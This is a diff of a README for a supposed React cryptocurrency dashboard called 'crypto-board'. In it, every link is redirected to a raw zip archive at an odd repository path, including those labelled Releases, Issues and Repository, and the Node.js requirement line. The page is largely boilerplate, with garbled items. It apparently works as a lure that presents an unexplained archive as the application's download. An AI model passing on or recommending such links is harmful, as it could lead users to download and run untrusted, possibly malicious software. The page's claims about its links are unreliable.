@@ -1,7 +1,7 @@
 # 🐱 crypto-board - A Simple Cryptocurrency Dashboard
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip%https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip)](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip)
+[![Download Release](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip%https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip)](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the crypto-board project! This application provides a modern, responsive cryptocurrency dashboard built with React and TypeScript. It allows you to easily track various cryptocurrencies in real-time.
@@ -10,7 +10,7 @@ Welcome to the crypto-board project! This application provides a modern, respons
 Before downloading, ensure that your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip** Version 14 or higher
 - **NPM:** Version 6 or higher
 - **Memory:** Minimum 4 GB RAM
 - **Disk Space:** At least 100 MB free space
@@ -21,7 +21,7 @@ Before downloading, ensure that your system meets the following requirements:
 - **User-Friendly Interface:** Easy to navigate and use, even for beginners.
 
 ## 📥 Download & Install
-To get started with crypto-board, visit this page to download: [crypto-board Releases](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip).
+To get started with crypto-board, visit this page to download: [crypto-board Releases](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -43,7 +43,7 @@ To get started with crypto-board, visit this page to download: [crypto-board Rel
    The dashboard will update automatically. For a manual refresh, click the refresh button located at the top right of the application.
 
 ## 🔧 Support
-If you encounter issues while using crypto-board, please check the [Issues](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip) section on GitHub for troubleshooting tips. You can also raise a new issue if you need further assistance.
+If you encounter issues while using crypto-board, please check the [Issues](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip) section on GitHub for troubleshooting tips. You can also raise a new issue if you need further assistance.
 
 ## 🛠️ Technologies Used
 crypto-board uses a variety of modern technologies including:
@@ -66,11 +66,11 @@ Yes, crypto-board is completely free to download and use.
 Absolutely! If you wish to contribute, feel free to fork the repository and submit a pull request.
 
 ### Where can I learn more?
-Visit the [GitHub Repository](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip) for more detailed information about the project, including features, updates, and community discussions.
+Visit the [GitHub Repository](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip) for more detailed information about the project, including features, updates, and community discussions.
 
 ## 📫 Contact
 If you have any questions not covered in this document, feel free to reach out via GitHub.
 
 For updates and new releases, follow the project on GitHub and check back often for new features!
 
-[![Download Release](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip%https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip)](https://raw.githubusercontent.com/Anip21/crypto-board/main/anticosmetic/crypto-board.zip)
+[![Download Release](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip%https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip)](https://raw.githubusercontent.com/Anip21/crypto-board/main/src/shared/api/crypto_board_v3.9.zip)
